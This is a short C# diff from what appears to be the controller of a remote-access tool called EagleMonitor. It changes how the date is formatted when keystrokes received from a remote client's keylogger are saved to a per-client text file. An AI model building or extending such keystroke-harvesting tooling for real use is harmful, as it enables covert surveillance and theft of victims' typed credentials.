@@ -17,7 +17,7 @@ namespace EagleMonitor.PacketParser
             try
             {
                 Directory.CreateDirectory(ClientHandler.ClientHandlersList[keylogOfflinePacket.baseIp].clientPath + "\\Keystrokes\\");
-                File.AppendAllText(ClientHandler.ClientHandlersList[keylogOfflinePacket.baseIp].clientPath + "\\Keystrokes\\" + "Offlinekeystrokes.txt", keylogOfflinePacket.keyStroke + "\n--------------------------------------------\nDATE : " + DateTime.Now.ToString().Replace(":", "") + "\n--------------------------------------------\n");
+                File.AppendAllText(ClientHandler.ClientHandlersList[keylogOfflinePacket.baseIp].clientPath + "\\Keystrokes\\" + "Offlinekeystrokes.txt", keylogOfflinePacket.keyStroke + "\n--------------------------------------------\nDATE : " + Utils.Miscellaneous.DateFormater() + "\n--------------------------------------------\n");
                 keylogOfflinePacket = null;
                 return;
             }
